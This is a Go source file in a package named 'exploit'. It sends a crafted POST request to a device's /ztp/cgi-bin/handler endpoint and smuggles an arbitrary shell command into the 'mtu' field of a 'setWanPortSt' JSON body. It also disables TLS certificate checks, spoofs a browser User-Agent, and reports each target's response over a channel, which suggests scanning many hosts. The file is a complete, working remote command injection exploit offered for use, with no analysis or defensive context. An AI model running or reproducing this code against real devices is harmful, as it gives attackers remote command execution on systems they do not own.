package exploit

import (
	"crypto/tls"
	"io"
	"net/http"
	"strings"
)

func Init() bool {
	return true
}

func getHeader() map[string]string {
	resp := make(map[string]string)
	resp["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
	resp["Content-Type"] = "application/json"
	return resp
}

func getData(cmd string) string {
	return "{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\":\"1\",\"vlanid\":\"5\",\"mtu\":\"; " + cmd + ";\",\"data\":\"\"}"
}

func SendPOST(target string, cmd string, ch chan string) string {
	defaultTransport := http.DefaultTransport.(*http.Transport)

	// Create new Transport that ignores self-signed SSL
	customTransport := &http.Transport{
		Proxy:                 defaultTransport.Proxy,
		DialContext:           defaultTransport.DialContext,
		MaxIdleConns:          defaultTransport.MaxIdleConns,
		IdleConnTimeout:       defaultTransport.IdleConnTimeout,
		ExpectContinueTimeout: defaultTransport.ExpectContinueTimeout,
		TLSHandshakeTimeout:   defaultTransport.TLSHandshakeTimeout,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: customTransport}

	header_map := getHeader()
	d := strings.NewReader(getData(cmd))
	target = "https://" + target + "/ztp/cgi-bin/handler"
	req, err := http.NewRequest("POST", target, d)
	if err != nil {
		ch <- "[-] The target: " + target + " isn't available for the request. The http port 443 is filtered or restricted"
		return "[-] The target: " + target + " isn't available for the request. The http port 443 is filtered or restricted"
	}

	for k, v := range header_map {
		req.Header.Set(k, v)
	}
	// Making the vulnerability request
	resp, err := client.Do(req)
	// if http://<IP>/ztp/cgi-bin/handler is unavailable we're skipping the target
	if err != nil {
		ch <- "No Connection"
		return "No Connection"
	}
	resp_str, err_h := io.ReadAll(resp.Body)
	if err_h != nil {
		ch <- "No Connection"
		return "No Connection"
	}
	ch <- string(resp_str)
	return string(resp_str)
}
